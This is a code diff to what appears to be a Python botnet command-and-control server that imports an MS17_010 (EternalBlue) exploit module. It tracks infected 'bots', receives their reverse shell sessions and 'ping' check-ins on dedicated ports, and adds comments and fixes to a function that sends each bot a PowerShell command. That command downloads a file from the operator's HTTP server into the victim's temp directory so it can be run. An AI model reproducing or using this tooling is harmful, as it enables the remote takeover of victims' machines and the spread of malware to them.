@@ -4,7 +4,7 @@
 
 
 import MS17_010
-from Exploits import *
+from exploits import *
 from Utilities import *
 import socket
 import threading
@@ -17,9 +17,13 @@ import socketserver
 bots=[]
 PingBots=[]
 myip="192.168.1.8"
+# You have to start httpd on this port:
 httpPort=6080
+# This port gets all shell sessions
 port = 6061
+# This port gets the "ping" sessions
 pingPort=6066
+# Debug mode
 debug = 0
 
 
@@ -104,25 +108,27 @@ def start_listing(port):
 
 """
 LocalLocation is the location on the server
-RLocation is the file name for the bot
+RLocation is the file name for the bot (Use $env:temp/RLocation -> $env:temp is)
 
-The idea is to run python HTTP service in the server.
+The idea is to run python HTTP service in the server. (I think i will just run it always)
 Send command to download from my server.. 
 execute
-close the connection by killing two processes.
 
 # TODO Try to find a way to make this happen.
 
 """
 def B2A(LocalLocation,sendANDrun):
-    RLocation = LocalLocation.split("/")[0]
+    # Get the last part in the path which should be the just name of the file
+    # Example: http://myip.com/anything/v.exe
+    # Then RLocation will be -> RLocation = $env:temp/v.exe
+    RLocation = "$env:temp/"+LocalLocation.split("/")[-1]
     # Run an http server as a thread
     # httpserver_thread = threading.Thread(target=httpserver, args=(httpPort,))
     # httpserver_thread.daemon = True
     # httpserver_thread.start()
 
     # setting up the command
-    command = "powershell.exe wget http://"+myip+":"+str(httpPort)+"/"+LocalLocation+" -o "+RLocation
+    command = "powershell.exe $env:temp/wget.exe http://"+myip+":"+str(httpPort)+"/"+LocalLocation+" -o "+RLocation
     command = command + "\r\n"
 
     # do this for all bots
@@ -412,6 +418,8 @@ def console():
         elif Command == "exit":
             break
         else:
+            print("To choose a session, list all bots then enter the"
+                  "port number of the bot to start a shell")
             pass
 
 def pingSockFun(consoleT,pingSock):
